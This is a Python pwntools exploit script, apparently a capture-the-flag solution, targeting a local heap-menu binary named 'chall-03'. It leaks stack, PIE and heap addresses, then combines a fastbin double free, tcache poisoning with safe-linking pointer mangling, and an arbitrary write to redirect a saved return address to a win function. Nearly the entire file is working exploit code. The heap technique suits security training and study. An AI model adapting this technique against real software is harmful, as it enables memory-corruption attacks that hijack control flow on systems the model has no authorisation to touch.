from pwn import *

STACK_CHOICE = 0xd3
PIE_CHOICE = 0x83

target = process("./chall-03")
gdb.attach(target)

MENU_STRING = b"Please enter menu choice:\n"

# Our I/O Wrapper Functions
def allocate_new_chunk(chunk_size: int, chunk_idx: int) -> None:
	target.recvuntil(MENU_STRING)
	target.sendline(b"1")
	target.recvuntil(b"Enter the chunk size between 0x0-0x5f0:\n")
	target.sendline(bytes(str(chunk_size), "utf-8"))
	target.recvuntil(b"Which chunk spot would you like to allocate?\n")
	target.sendline(bytes(str(chunk_idx), "utf-8"))

def view_chunk(chunk_idx: int) -> bytes:
	target.recvuntil(MENU_STRING)
	target.sendline(b"2")
	target.recvuntil(b"Which chunk idx would you like?\n")
	target.sendline(bytes(str(chunk_idx), "utf-8"))
	target.recvuntil(b"Chunk Contents: ")
	contents = target.recvuntil(b"\x0d\x0a")
	return contents[:-2]

def edit_chunk(chunk_idx: int, chunk_contents: bytes) -> None:
	target.recvuntil(MENU_STRING)
	target.sendline(b"3")
	target.recvuntil(b"Which chunk idx would you like?\n")
	target.sendline(bytes(str(chunk_idx), "utf-8"))
	target.recvuntil(b"Please input new chunk content:\n")
	target.sendline(chunk_contents)

def free_chunk(chunk_idx: int) -> None:
	target.recvuntil(MENU_STRING)
	target.sendline(b"4")
	target.recvuntil(b"Which chunk idx would you like?\n")
	target.sendline(bytes(str(chunk_idx), "utf-8"))

def remove_chunk(chunk_idx: int) -> None:
	target.recvuntil(MENU_STRING)
	target.sendline(b"5")
	target.recvuntil(b"Which chunk idx would you like?\n")
	target.sendline(bytes(str(chunk_idx), "utf-8"))

def secret(chunk_idx: int, choice: int) -> None:
	target.recvuntil(MENU_STRING)
	target.sendline(b"6")
	target.recvuntil(b"Which chunk idx would you like?\n")
	target.sendline(bytes(str(chunk_idx), "utf-8"))
	target.recvuntil(b"Choice?\n")
	target.sendline(bytes(str(choice), "utf-8"))

# 7 tcache chunks
allocate_new_chunk(0x50, 0)
allocate_new_chunk(0x50, 1)
allocate_new_chunk(0x50, 2)
allocate_new_chunk(0x50, 3)
allocate_new_chunk(0x50, 4)
allocate_new_chunk(0x50, 5)
allocate_new_chunk(0x50, 6)

# Get PIE / Stack infoleaks
secret(0, STACK_CHOICE)
chunk_contents = view_chunk(0)
stack_leak_contents = chunk_contents[0:6]
stack_leak = u64(stack_leak_contents + b"\x00"*2)
ret_address = stack_leak + 0x38

secret(0, PIE_CHOICE)
pie_leak = view_chunk(0)
pie_leak_value = pie_leak[0:6]
pie_base = u64(pie_leak_value + b"\x00"*2) - 0x17b6
win_func = pie_base + 0x12d0

# 2 Fastbin chunks
allocate_new_chunk(0x50, 7)
allocate_new_chunk(0x50, 8)

# Fill up the tcache
free_chunk(0)
free_chunk(1)
free_chunk(2)
free_chunk(3)
free_chunk(4)
free_chunk(5)
free_chunk(6)

# Insert the same chunk twice into the fastbin
free_chunk(7)
free_chunk(8)
free_chunk(7)

# Clear out some space in the `chunks` array
remove_chunk(0)
remove_chunk(1)
remove_chunk(2)
remove_chunk(3)
remove_chunk(4)
remove_chunk(5)
remove_chunk(6)

# Empty out the tcache bin
allocate_new_chunk(0x50, 0)
allocate_new_chunk(0x50, 1)
allocate_new_chunk(0x50, 2)
allocate_new_chunk(0x50, 3)
allocate_new_chunk(0x50, 4)
allocate_new_chunk(0x50, 5)
allocate_new_chunk(0x50, 6)

# Allocate our fastbin chunk, move over the chunks to the tcache
allocate_new_chunk(0x50, 9)

# Get the heap infoleak
heap_leak = view_chunk(6)

heap_leak_value = u64(heap_leak + b"\x00"*(8-len(heap_leak)))
heap_chunk_address = (heap_leak_value << 12) + 0x6c0
heap_base = heap_chunk_address - 0x16c0

print("Heap base is: " + hex(heap_base))
print("Pie Base is: " + hex(pie_base))
print("Stack Leak: " + hex(stack_leak))

heap_chunk_address = heap_base + 0x1960
chunks_address = pie_base + 0x4040
next_ptr = ((heap_chunk_address >> 12) ^ chunks_address)

# Write the next ptr for chunks
edit_chunk(9, p64(next_ptr))

# Allocate chunks from the tcache until we get chunks
allocate_new_chunk(0x50, 10)
allocate_new_chunk(0x50, 11)
allocate_new_chunk(0x50, 12)

# Write our stack return address
edit_chunk(12, p64(ret_address))

# Overwrite the saved stack return address
edit_chunk(0, p64(win_func))

target.interactive()
